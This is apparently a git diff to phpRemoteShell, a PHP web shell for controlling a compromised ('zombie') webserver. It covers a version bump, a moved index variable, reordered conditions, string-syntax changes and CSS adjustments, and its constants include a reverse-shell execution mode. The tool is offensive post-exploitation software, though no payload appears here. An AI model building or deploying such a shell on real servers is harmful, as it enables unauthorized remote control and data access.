@@ -22,7 +22,7 @@
   if (!class_exists ('phpRemoteShell')){
 
   define ('APP_NAME', 'phpRemoteShell');
-  define ('APP_VERSION', '0.12.1git201906121');
+  define ('APP_VERSION', '0.12.1git201906151');
 
   // Main configuration array
   $config = array ();
@@ -42,10 +42,9 @@
 
   // Default user/group for the remote webserver process when they can not 
   // be retreived automatically.
+  // -> 33, 48, 65534...
   define ('HTTPD_DEFAULT_UID', 33);
-  //define ('HTTPD_DEFAULT_UID', 65534);
   define ('HTTPD_DEFAULT_GID', 33);
-  //define ('HTTPD_DEFAULT_GID', 65534);
   
   // FIXME
   // Set it to true if you want pages browsed by the zombie being viewed in a
@@ -80,9 +79,6 @@
   
   /* //////////////////// END  "CUSTOMIZE ME" SECTION \\\\\\\\\\\\\\\\\\\\ */
   
-  // Uniq index
-  $_uniq_code = 1;
- 
   umask (0);
 
   // Try to deactivate PHP magic quotes
@@ -113,6 +109,9 @@
   define ('AJAX_REFRESH_INTERVAL', 10000);
   define ('AJAX_PING_TIMEOUT', 10000);
   
+  // Uniq index
+  $_uniq_code = 1;
+
   // PHP shell history
   define ('SHELL_EXECUTE', $_uniq_code++);
   define ('SHELL_EXECUTE_REVERSE', $_uniq_code++);
@@ -611,7 +610,7 @@
         $res = '';
       }
 
-      if (!$res && is_callable ('getcwd'))
+      if (!$res && $this->check_php_function ('getcwd'))
       {
         $res = getcwd ();
       }
@@ -621,7 +620,7 @@
         $res = $_SERVER['DOCUMENT_ROOT'];
       }
 
-      if (substr ($res, -1) != '/')
+      if ($res{strlen($res)-1} != '/')
       {
         $res .= '/';
       }
@@ -635,7 +634,7 @@
       {
         foreach ($this->config['php_functions'] as $k => $v)
         {
-          if ($v['type'] == 'exec' && $v['enabled'])
+          if ($v['enabled'] && $v['type'] == 'exec')
           {
             return $k;
           }
@@ -656,7 +655,7 @@
       {
         foreach ($this->config['php_functions'] as $k => $v)
         {
-          if ($v['type'] == 'exec' && $v['enabled']) 
+          if ($v['enabled'] && $v['type'] == 'exec')
           {
             return 1;
           }
@@ -668,7 +667,7 @@
     {
       foreach ($this->config['php_functions'] as $k => $v)
       {
-        if ($v['type'] == 'browse' && $v['enabled']) 
+        if ($v['enabled'] && $v['type'] == 'browse')
         {
           return 1;
         }
@@ -754,8 +753,8 @@
           case 'opendir':
             if ($d = opendir ($this->get_root_path ()))
             {
-              closedir ($d);
               $ret = 1;
+              closedir ($d);
             }
             break;
 
@@ -1003,13 +1002,13 @@
     function history_exists ()
     {
       return (is_array ($this->vars['history']) &&
-              count ($this->vars['history']) > 0);
+              count ($this->vars['history']));
     }
 
     function sql_history_exists ()
     {
       return (is_array ($this->vars['sql_history']) && 
-              count ($this->vars['sql_history']) > 0);
+              count ($this->vars['sql_history']));
     }
 
     function cmd_replace_aliases ($cmd)
@@ -1767,7 +1766,7 @@
       {
         foreach ($d as $item) 
         {
-          if (substr ($item, -1) != '.')
+          if ($item{strlen($item)-1} != '.')
           {
             $this->_rmdirr_glob ($item);
           }
@@ -3396,7 +3395,7 @@
       $arr = array ();
       $arr_sort = array ();
 
-      if (substr ($dir, -1) != '/')
+      if ($dir{strlen($dir)-1} != '/')
       {
         $dir .= '/';
       }
@@ -3482,7 +3481,7 @@
       $arr = array ();
       $arr_sort = array ();
 
-      if (substr ($dir, -1) != '/')
+      if ($dir{strlen($dir)-1} != '/')
       {
         $dir .= '/';
       }
@@ -5764,9 +5763,13 @@ exit ();
     white-space: nowrap;
   }
   th.win_close {
-    text-align: right; background: black; color: orange; 
+    text-align: center;
+    vertical-align: middle;
+    background: black;
+    color: orange; 
     border: 1px orange solid;
     cursor: pointer;
+    width:10px;
   }
   table.action_result,
   table.remote_infos {
@@ -5868,7 +5871,7 @@ exit ();
   div#profile_title {
     margin-left:auto;
     margin-right:auto;
-    width:440px;
+    max-width:620px;
     padding: 5px;
   }
   div#profile_title > div {
